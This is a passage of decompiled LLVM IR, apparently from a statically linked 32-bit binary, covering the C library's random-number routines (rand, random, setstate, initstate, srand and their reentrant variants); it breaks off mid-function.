dec_label_pc_8054b4c:                             ; preds = %dec_label_pc_8054b40, %dec_label_pc_8054b44
  %v0_8054b4c = phi i8 [ %v0_8054adf, %dec_label_pc_8054b40 ], [ 3, %dec_label_pc_8054b44 ]
  %v9_8054b4c = icmp eq i8 %v0_8054b4c, 3
  %v1_8054b53 = icmp eq i1 %v9_8054b4c, false
  br i1 %v1_8054b53, label %dec_label_pc_8054b66, label %dec_label_pc_8054b55

dec_label_pc_8054b55:                             ; preds = %dec_label_pc_8054b4c
  store i8 4, i8* @global_var_80646c0.543, align 64
  %v1_8054b61 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8054b66:                             ; preds = %dec_label_pc_8054b4c, %dec_label_pc_8054b66
  br label %dec_label_pc_8054b66

; uselistorder directives
  uselistorder i32 %v1_8054b1b, { 2, 1, 0 }
  uselistorder i8 %v0_8054adf, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8054a7e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 4, 8, 6, 7, 1, 2, 5, 3 }
  uselistorder i8* @global_var_80646c0.543, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b66, { 1, 0 }
  uselistorder label %dec_label_pc_8054b4c, { 1, 0 }
  uselistorder label %dec_label_pc_8054adf, { 1, 0 }
  uselistorder label %dec_label_pc_8054aa7, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8054b6c = call i32 @random()
  ret i32 %v0_8054b6c

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 5, 4, 3, 2, 8, 7, 6, 12, 1, 0, 11, 10, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b74 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b74, i32* %stack_var_-4, align 4
  %v2_8054b82 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054b82, i32* @ebx, align 4
  %v2_8054b87 = call i32 @__pthread_return_void(i32 %v2_8054b82, i32 134567263)
  %v1_8054b93 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e360.544 to i32))
  %v2_8054b9a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8054ba4 = call i32 @__GI_random_r(i32* nonnull @global_var_805e378, i32 %v2_8054b9a)
  store i32 ptrtoint (i32* @global_var_805e378 to i32), i32* @eax, align 4
  %v2_8054bae = call i32 @__pthread_return_void(i32 %v2_8054b82, i32 1)
  %v3_8054bb3 = load i32, i32* %stack_var_-8, align 4
  %v2_8054bba = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054bba, i32* @ebx, align 4
  ret i32 %v3_8054bb3
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8054bcd = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054bcd, i32* @eax, align 4
  %v2_8054bd2 = call i32 @__pthread_return_void(i32 %v2_8054bcd, i32 134567263)
  %v1_8054bde = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e360.544 to i32))
  %v0_8054be3 = load i32, i32* bitcast (i32** @global_var_805e380.547 to i32*), align 128
  store i32 %v0_8054be3, i32* @ebx, align 4
  %v3_8054bf4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805e378)
  %v2_8054bfc = icmp slt i32 %v3_8054bf4, 0
  br i1 %v2_8054bfc, label %dec_label_pc_8054c03, label %dec_label_pc_8054c00

dec_label_pc_8054c00:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805e37c.548 to i32), i32* @esi, align 4
  br label %dec_label_pc_8054c03

dec_label_pc_8054c03:                             ; preds = %entry, %dec_label_pc_8054c00
  store i32 %v2_8054bcd, i32* @eax, align 4
  %v2_8054c0c = call i32 @__pthread_return_void(i32 %v2_8054bcd, i32 1)
  %v0_8054c14 = load i32, i32* @esi, align 4
  ret i32 %v0_8054c14

; uselistorder directives
  uselistorder label %dec_label_pc_8054c03, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054c28 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054c28, i32* @ebx, align 4
  %v2_8054c2d = call i32 @__pthread_return_void(i32 %v2_8054c28, i32 134567263)
  %v1_8054c39 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e360.544 to i32))
  store i32 ptrtoint (i32** @global_var_805e37c.548 to i32), i32* @esi, align 4
  %v4_8054c58 = inttoptr i32 %arg2 to i32*
  %v5_8054c58 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8054c58, i32 %arg3, i32 ptrtoint (i32* @global_var_805e378 to i32))
  store i32 %v5_8054c58, i32* @eax, align 4
  %v2_8054c63 = call i32 @__pthread_return_void(i32 %v2_8054c28, i32 1)
  %v0_8054c6b = load i32, i32* @esi, align 4
  ret i32 %v0_8054c6b
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c70 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c70, i32* %stack_var_-4, align 4
  %v2_8054c7e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8054c7e, i32* @ebx, align 4
  %v2_8054c83 = call i32 @__pthread_return_void(i32 %v2_8054c7e, i32 134567263)
  %v1_8054c8f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e360.544 to i32))
  %v3_8054c9f = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805e378)
  store i32 ptrtoint (i32* @global_var_805e378 to i32), i32* @eax, align 4
  %v2_8054ca9 = call i32 @__pthread_return_void(i32 %v2_8054c7e, i32 1)
  %v2_8054cb1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054cb1, i32* @ebx, align 4
  ret i32 %v2_8054ca9

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805e378 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805e378, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8054cb7 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8054cc3 = add i32 %tmp3, 12
  %v2_8054cc3 = inttoptr i32 %v1_8054cc3 to i32*
  %v3_8054cc3 = load i32, i32* %v2_8054cc3, align 4
  store i32 %v3_8054cc3, i32* %ecx.global-to-local, align 4
  %v1_8054cc6 = add i32 %arg1, 4
  store i32 %v1_8054cc6, i32* %esi.global-to-local, align 4
  %v1_8054cc9 = add i32 %tmp3, 8
  %v2_8054cc9 = inttoptr i32 %v1_8054cc9 to i32*
  %v3_8054cc9 = load i32, i32* %v2_8054cc9, align 4
  %v1_8054ccc = icmp eq i32 %v3_8054cc3, 0
  %v1_8054cce = icmp eq i1 %v1_8054ccc, false
  br i1 %v1_8054cce, label %dec_label_pc_8054cd9, label %dec_label_pc_8054cd0

dec_label_pc_8054cd0:                             ; preds = %entry
  %v1_8054cd0 = add i32 %v3_8054cc9, -4
  %v2_8054cd0 = inttoptr i32 %v1_8054cd0 to i32*
  store i32 0, i32* %v2_8054cd0, align 4
  br label %dec_label_pc_8054ce9

dec_label_pc_8054cd9:                             ; preds = %entry
  %v1_8054cd9 = add i32 %tmp3, 4
  %v2_8054cd9 = inttoptr i32 %v1_8054cd9 to i32*
  %v3_8054cd9 = load i32, i32* %v2_8054cd9, align 4
  %v2_8054cdc = sub i32 %v3_8054cd9, %v3_8054cc9
  %v2_8054cde = sdiv i32 %v2_8054cdc, 4
  %v3_8054ce1 = mul i32 %v2_8054cde, 5
  %v2_8054ce4 = add i32 %v3_8054ce1, %v3_8054cc3
  store i32 %v2_8054ce4, i32* %eax.global-to-local, align 4
  %v2_8054ce6 = add i32 %v3_8054cc9, -4
  %v3_8054ce6 = inttoptr i32 %v2_8054ce6 to i32*
  store i32 %v2_8054ce4, i32* %v3_8054ce6, align 4
  br label %dec_label_pc_8054ce9

dec_label_pc_8054ce9:                             ; preds = %dec_label_pc_8054cd0, %dec_label_pc_8054cd9
  %v0_8054ce9 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054ce9 = add i32 %v0_8054ce9, -4
  %v2_8054ce9 = inttoptr i32 %v1_8054ce9 to i32*
  %v3_8054ce9 = load i32, i32* %v2_8054ce9, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8054cf1 = ashr i32 %v3_8054ce9, 31
  %v2_8054cf2 = zext i32 %v3_8054ce9 to i64
  %v4_8054cf2 = zext i32 %v1_8054cf1 to i64
  %v5_8054cf2 = mul nuw i64 %v4_8054cf2, 4294967296
  %v6_8054cf2 = or i64 %v5_8054cf2, %v2_8054cf2
  %v8_8054cf2 = sdiv i64 %v6_8054cf2, 5
  %v9_8054cf2 = trunc i64 %v8_8054cf2 to i32
  store i32 %v9_8054cf2, i32* %eax.global-to-local, align 4
  %v10_8054cf2 = srem i64 %v6_8054cf2, 5
  %v11_8054cf2 = trunc i64 %v10_8054cf2 to i32
  %v6_8054cf7 = icmp ugt i32 %v11_8054cf2, 4
  br i1 %v6_8054cf7, label %dec_label_pc_8054d37, label %dec_label_pc_8054cf9

dec_label_pc_8054cf9:                             ; preds = %dec_label_pc_8054ce9
  %v1_8054cf9 = mul i32 %v11_8054cf2, 4
  %v2_8054cf9 = add i32 %v1_8054cf9, ptrtoint (i32* @global_var_805cdd4.549 to i32)
  %v3_8054cf9 = inttoptr i32 %v2_8054cf9 to i32*
  %v4_8054cf9 = load i32, i32* %v3_8054cf9, align 4
  store i32 %v4_8054cf9, i32* %ecx.global-to-local, align 4
  %v1_8054d00 = icmp eq i32 %v11_8054cf2, 0
  %v2_8054d02 = add i32 %v1_8054cf9, ptrtoint (i32* @global_var_805cdc0.550 to i32)
  %v3_8054d02 = inttoptr i32 %v2_8054d02 to i32*
  %v4_8054d02 = load i32, i32* %v3_8054d02, align 4
  store i32 %v4_8054d02, i32* %ebp.global-to-local, align 4
  %v1_8054d09 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d09 = add i32 %v1_8054d09, 12
  %v3_8054d09 = inttoptr i32 %v2_8054d09 to i32*
  store i32 %v11_8054cf2, i32* %v3_8054d09, align 4
  %v0_8054d0c = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054d0c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d0c = add i32 %v1_8054d0c, 16
  %v3_8054d0c = inttoptr i32 %v2_8054d0c to i32*
  store i32 %v0_8054d0c, i32* %v3_8054d0c, align 4
  %v0_8054d0f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054d0f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d0f = add i32 %v1_8054d0f, 20
  %v3_8054d0f = inttoptr i32 %v2_8054d0f to i32*
  store i32 %v0_8054d0f, i32* %v3_8054d0f, align 4
  br i1 %v1_8054d00, label %dec_label_pc_8054d2a, label %dec_label_pc_8054d14

dec_label_pc_8054d14:                             ; preds = %dec_label_pc_8054cf9
  %v0_8054d14 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054d14 = add i32 %v0_8054d14, -4
  %v2_8054d14 = inttoptr i32 %v1_8054d14 to i32*
  %v3_8054d14 = load i32, i32* %v2_8054d14, align 4
  %v1_8054d17 = ashr i32 %v3_8054d14, 31
  %v0_8054d18 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054d18 = zext i32 %v3_8054d14 to i64
  %v4_8054d18 = zext i32 %v1_8054d17 to i64
  %v5_8054d18 = mul nuw i64 %v4_8054d18, 4294967296
  %v6_8054d18 = or i64 %v5_8054d18, %v2_8054d18
  %v7_8054d18 = zext i32 %v0_8054d18 to i64
  %v8_8054d18 = sdiv i64 %v6_8054d18, %v7_8054d18
  %v9_8054d18 = trunc i64 %v8_8054d18 to i32
  %v2_8054d1a = mul i32 %v9_8054d18, 4
  %v3_8054d1a = add i32 %v2_8054d1a, %v0_8054d14
  %v1_8054d1d = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d1d = add i32 %v1_8054d1d, %v9_8054d18
  store i32 %v2_8054d1d, i32* %eax.global-to-local, align 4
  %v1_8054d1f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d1f = add i32 %v1_8054d1f, 4
  %v3_8054d1f = inttoptr i32 %v2_8054d1f to i32*
  store i32 %v3_8054d1a, i32* %v3_8054d1f, align 4
  %v0_8054d22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054d22 = ashr i32 %v0_8054d22, 31
  %v0_8054d23 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054d23 = zext i32 %v0_8054d22 to i64
  %v4_8054d23 = zext i32 %v1_8054d22 to i64
  %v5_8054d23 = mul nuw i64 %v4_8054d23, 4294967296
  %v6_8054d23 = or i64 %v5_8054d23, %v2_8054d23
  %v7_8054d23 = zext i32 %v0_8054d23 to i64
  %v8_8054d23 = sdiv i64 %v6_8054d23, %v7_8054d23
  %v9_8054d23 = trunc i64 %v8_8054d23 to i32
  store i32 %v9_8054d23, i32* %eax.global-to-local, align 4
  %v10_8054d23 = srem i64 %v6_8054d23, %v7_8054d23
  %v11_8054d23 = trunc i64 %v10_8054d23 to i32
  %v0_8054d25 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054d25 = mul i32 %v11_8054d23, 4
  %v3_8054d25 = add i32 %v2_8054d25, %v0_8054d25
  %v1_8054d28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d28 = inttoptr i32 %v1_8054d28 to i32*
  store i32 %v3_8054d25, i32* %v2_8054d28, align 4
  br label %dec_label_pc_8054d2a

dec_label_pc_8054d2a:                             ; preds = %dec_label_pc_8054cf9, %dec_label_pc_8054d14
  %v0_8054d2a = load i32, i32* %esi.global-to-local, align 4
  %v1_8054d2a = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054d2a = mul i32 %v1_8054d2a, 4
  %v3_8054d2a = add i32 %v2_8054d2a, %v0_8054d2a
  %v1_8054d2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d2d = add i32 %v1_8054d2d, 24
  %v3_8054d2d = inttoptr i32 %v2_8054d2d to i32*
  store i32 %v3_8054d2a, i32* %v3_8054d2d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054d32 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054d32 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d32 = add i32 %v1_8054d32, 8
  %v3_8054d32 = inttoptr i32 %v2_8054d32 to i32*
  store i32 %v0_8054d32, i32* %v3_8054d32, align 4
  %v0_8054d4c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d45

dec_label_pc_8054d37:                             ; preds = %dec_label_pc_8054ce9
  %v1_8054d37 = call i32 @__errno_location(i32 %v0_8054cb7)
  %v1_8054d3c = inttoptr i32 %v1_8054d37 to i32*
  store i32 22, i32* %v1_8054d3c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d45

dec_label_pc_8054d45:                             ; preds = %dec_label_pc_8054d2a, %dec_label_pc_8054d37
  %v0_8054d4c = phi i32 [ %v0_8054d4c.pre, %dec_label_pc_8054d2a ], [ -1, %dec_label_pc_8054d37 ]
  store i32 %v0_8054cb7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054d4c

; uselistorder directives
  uselistorder i32 %v11_8054cf2, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054d45, { 1, 0 }
  uselistorder label %dec_label_pc_8054d2a, { 1, 0 }
  uselistorder label %dec_label_pc_8054ce9, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8054d50 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d50, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054d59 = add i32 %tmp3, 12
  %v2_8054d59 = inttoptr i32 %v1_8054d59 to i32*
  %v3_8054d59 = load i32, i32* %v2_8054d59, align 4
  %v4_8054d59 = icmp eq i32 %v3_8054d59, 0
  %v1_8054d5d = add i32 %tmp3, 8
  %v2_8054d5d = inttoptr i32 %v1_8054d5d to i32*
  %v3_8054d5d = load i32, i32* %v2_8054d5d, align 4
  store i32 %v3_8054d5d, i32* %esi.global-to-local, align 4
  %v1_8054d60 = icmp eq i1 %v4_8054d59, false
  br i1 %v1_8054d60, label %dec_label_pc_8054d79, label %dec_label_pc_8054d62

dec_label_pc_8054d62:                             ; preds = %entry
  %v2_8054d62 = inttoptr i32 %v3_8054d5d to i32*
  %v3_8054d62 = load i32, i32* %v2_8054d62, align 4
  %v5_8054d62 = mul i32 %v3_8054d62, 1103515245
  %v1_8054d68 = add i32 %v5_8054d62, 12345
  %v1_8054d6d = urem i32 %v1_8054d68, -2147483648
  store i32 %v1_8054d6d, i32* %eax.global-to-local, align 4
  store i32 %v1_8054d6d, i32* %v2_8054d62, align 4
  %v0_8054d74 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054d74 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d74 = inttoptr i32 %v1_8054d74 to i32*
  store i32 %v0_8054d74, i32* %v2_8054d74, align 4
  br label %dec_label_pc_8054da4

dec_label_pc_8054d79:                             ; preds = %entry
  %v1_8054d79 = add i32 %tmp3, 4
  %v2_8054d79 = inttoptr i32 %v1_8054d79 to i32*
  %v3_8054d79 = load i32, i32* %v2_8054d79, align 4
  store i32 %v3_8054d79, i32* %ecx.global-to-local, align 4
  %v2_8054d7c = load i32, i32* %arg1, align 4
  store i32 %v2_8054d7c, i32* %edx.global-to-local, align 4
  %v1_8054d7e = add i32 %tmp3, 24
  %v2_8054d7e = inttoptr i32 %v1_8054d7e to i32*
  %v3_8054d7e = load i32, i32* %v2_8054d7e, align 4
  store i32 %v3_8054d7e, i32* %edi.global-to-local, align 4
  %v1_8054d81 = inttoptr i32 %v3_8054d79 to i32*
  %v2_8054d81 = load i32, i32* %v1_8054d81, align 4
  store i32 %v2_8054d81, i32* %eax.global-to-local, align 4
  %v1_8054d83 = inttoptr i32 %v2_8054d7c to i32*
  %v2_8054d83 = load i32, i32* %v1_8054d83, align 4
  %v4_8054d83 = add i32 %v2_8054d83, %v2_8054d81
  store i32 %v4_8054d83, i32* %v1_8054d83, align 4
  %v0_8054d85 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d85 = inttoptr i32 %v0_8054d85 to i32*
  %v2_8054d85 = load i32, i32* %v1_8054d85, align 4
  %v1_8054d87 = add i32 %v0_8054d85, 4
  store i32 %v1_8054d87, i32* %edx.global-to-local, align 4
  %v2_8054d8a = udiv i32 %v2_8054d85, 2
  %v1_8054d8c = load i32, i32* %edi.global-to-local, align 4
  %v7_8054d8c = icmp ult i32 %v1_8054d87, %v1_8054d8c
  %v1_8054d8e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d8e = inttoptr i32 %v1_8054d8e to i32*
  store i32 %v2_8054d8a, i32* %v2_8054d8e, align 4
  %v0_8054d91 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054d91 = add i32 %v0_8054d91, 4
  store i32 %v1_8054d91, i32* %eax.global-to-local, align 4
  br i1 %v7_8054d8c, label %dec_label_pc_8054d9a, label %dec_label_pc_8054d96

dec_label_pc_8054d96:                             ; preds = %dec_label_pc_8054d79
  %v0_8054d96 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8054d96, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d9f

dec_label_pc_8054d9a:                             ; preds = %dec_label_pc_8054d79
  %v1_8054d9a = load i32, i32* %edi.global-to-local, align 4
  %v7_8054d9a = icmp ult i32 %v1_8054d91, %v1_8054d9a
  %v1_8054d9c = icmp eq i1 %v7_8054d9a, false
  %v3_8054d9c = load i32, i32* %esi.global-to-local, align 4
  %v4_8054d9c = select i1 %v1_8054d9c, i32 %v3_8054d9c, i32 %v1_8054d91
  store i32 %v4_8054d9c, i32* %eax.global-to-local, align 4
  %v0_8054d9f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d9f

dec_label_pc_8054d9f:                             ; preds = %dec_label_pc_8054d96, %dec_label_pc_8054d9a
  %v0_8054d9f = phi i32 [ %v0_8054d96, %dec_label_pc_8054d96 ], [ %v0_8054d9f.pre, %dec_label_pc_8054d9a ]
  %v1_8054d9f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d9f = inttoptr i32 %v1_8054d9f to i32*
  store i32 %v0_8054d9f, i32* %v2_8054d9f, align 4
  %v0_8054da1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054da1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054da1 = add i32 %v1_8054da1, 4
  %v3_8054da1 = inttoptr i32 %v2_8054da1 to i32*
  store i32 %v0_8054da1, i32* %v3_8054da1, align 4
  br label %dec_label_pc_8054da4

dec_label_pc_8054da4:                             ; preds = %dec_label_pc_8054d62, %dec_label_pc_8054d9f
  %v2_8054da4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054da4, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8054d6d, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054da4, { 1, 0 }
  uselistorder label %dec_label_pc_8054d9f, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8054dab = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054daf = load i32, i32* @edi, align 4
  %v0_8054db0 = load i32, i32* @esi, align 4
  %v0_8054db1 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8054dbd = add i32 %tmp14, 12
  %v2_8054dbd = inttoptr i32 %v1_8054dbd to i32*
  %v3_8054dbd = load i32, i32* %v2_8054dbd, align 4
  store i32 %v3_8054dbd, i32* %ecx.global-to-local, align 4
  %v6_8054dc3 = icmp ugt i32 %v3_8054dbd, 4
  br i1 %v6_8054dc3, label %dec_label_pc_8054e3d, label %dec_label_pc_8054dc5

dec_label_pc_8054dc5:                             ; preds = %entry
  %v1_8054dc5 = add i32 %tmp14, 8
  %v2_8054dc5 = inttoptr i32 %v1_8054dc5 to i32*
  %v3_8054dc5 = load i32, i32* %v2_8054dc5, align 4
  store i32 %v3_8054dc5, i32* %ebx.global-to-local, align 4
  %v1_8054dc8 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8054dcf = select i1 %v1_8054dc8, i32 1, i32 %arg1
  store i32 %v3_8054dcf, i32* %edx.global-to-local, align 4
  %v1_8054dd2 = icmp eq i32 %v3_8054dbd, 0
  %v2_8054dd4 = inttoptr i32 %v3_8054dc5 to i32*
  store i32 %v3_8054dcf, i32* %v2_8054dd4, align 4
  br i1 %v1_8054dd2, label %dec_label_pc_8054e3b, label %dec_label_pc_8054dd8

dec_label_pc_8054dd8:                             ; preds = %dec_label_pc_8054dc5
  %v0_8054dd8 = load i32, i32* @esi, align 4
  %v1_8054dd8 = add i32 %v0_8054dd8, 16
  %v2_8054dd8 = inttoptr i32 %v1_8054dd8 to i32*
  %v3_8054dd8 = load i32, i32* %v2_8054dd8, align 4
  store i32 %v3_8054dd8, i32* %eax.global-to-local, align 4
  %v0_8054ddb = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054ddb, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8054de2 = sext i32 %v3_8054dd8 to i64
  store i64 %v4_8054de2, i64* %stack_var_-40, align 8
  %v5_8054e1832 = icmp sgt i32 %v3_8054dd8, 1
  br i1 %v5_8054e1832, label %dec_label_pc_8054de7, label %dec_label_pc_8054e1a

dec_label_pc_8054de7:                             ; preds = %dec_label_pc_8054dd8, %dec_label_pc_8054de7.dec_label_pc_8054de7_crit_edge
  %v0_8054e0f = phi i32 [ %v0_8054e0f.pre, %dec_label_pc_8054de7.dec_label_pc_8054de7_crit_edge ], [ %v0_8054ddb, %dec_label_pc_8054dd8 ]
  %v0_8054de7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054dee = ashr i32 %v0_8054de7, 31
  %v2_8054def = zext i32 %v0_8054de7 to i64
  %v4_8054def = zext i32 %v1_8054dee to i64
  %v5_8054def = mul nuw i64 %v4_8054def, 4294967296
  %v6_8054def = or i64 %v5_8054def, %v2_8054def
  %v8_8054def = sdiv i64 %v6_8054def, 127773
  %v9_8054def = trunc i64 %v8_8054def to i32
  %v10_8054def = srem i64 %v6_8054def, 127773
  %v3_8054df5 = mul nsw i64 %v10_8054def, 16807
  %v4_8054df5 = trunc i64 %v3_8054df5 to i32
  %tmp24 = mul i32 %v9_8054def, -2836
  %v2_8054e01 = add i32 %v4_8054df5, %tmp24
  %v1_8054e03 = add i32 %v2_8054e01, 1
  %v6_8054e03 = xor i32 %v2_8054e01, -2147483648
  %v7_8054e03 = xor i32 %v1_8054e03, %v2_8054e01
  %v8_8054e03 = and i32 %v7_8054e03, %v6_8054e03
  %v9_8054e03 = icmp slt i32 %v8_8054e03, 0
  %v10_8054e03 = icmp eq i32 %v1_8054e03, 0
  %v11_8054e03 = icmp slt i32 %v1_8054e03, 0
  %v1_8054e06 = add i32 %v2_8054e01, 2147483647
  store i32 %v1_8054e06, i32* %eax.global-to-local, align 4
  %v3_8054e0c = icmp ne i1 %v11_8054e03, %v9_8054e03
  %v4_8054e0c = or i1 %v10_8054e03, %v3_8054e0c
  %v7_8054e0c = select i1 %v4_8054e0c, i32 %v1_8054e06, i32 %v2_8054e01
  store i32 %v7_8054e0c, i32* %edx.global-to-local, align 4
  %v1_8054e0f = add i32 %v0_8054e0f, 4
  store i32 %v1_8054e0f, i32* %ecx.global-to-local, align 4
  %v2_8054e12 = inttoptr i32 %v1_8054e0f to i32*
  store i32 %v7_8054e0c, i32* %v2_8054e12, align 4
  %v0_8054e14 = load i32, i32* @edi, align 4
  %v1_8054e14 = add i32 %v0_8054e14, 1
  store i32 %v1_8054e14, i32* @edi, align 4
  %v3_8054e15.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8054e15.pre to i32
  %v5_8054e18 = icmp slt i32 %v1_8054e14, %extract.t11
  br i1 %v5_8054e18, label %dec_label_pc_8054de7.dec_label_pc_8054de7_crit_edge, label %dec_label_pc_8054e15.dec_label_pc_8054e1a_crit_edge

dec_label_pc_8054de7.dec_label_pc_8054de7_crit_edge: ; preds = %dec_label_pc_8054de7
  %v0_8054e0f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054de7

dec_label_pc_8054e15.dec_label_pc_8054e1a_crit_edge: ; preds = %dec_label_pc_8054de7
  %v0_8054e1a.pre = load i32, i32* @esi, align 4
  %v0_8054e1d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e1a

dec_label_pc_8054e1a:                             ; preds = %dec_label_pc_8054e15.dec_label_pc_8054e1a_crit_edge, %dec_label_pc_8054dd8
  %v0_8054e1d = phi i32 [ %v0_8054e1d.pre, %dec_label_pc_8054e15.dec_label_pc_8054e1a_crit_edge ], [ %v0_8054ddb, %dec_label_pc_8054dd8 ]
  %v0_8054e1a = phi i32 [ %v0_8054e1a.pre, %dec_label_pc_8054e15.dec_label_pc_8054e1a_crit_edge ], [ %v0_8054dd8, %dec_label_pc_8054dd8 ]
  %v1_8054e1a = add i32 %v0_8054e1a, 20
  %v2_8054e1a = inttoptr i32 %v1_8054e1a to i32*
  %v3_8054e1a = load i32, i32* %v2_8054e1a, align 4
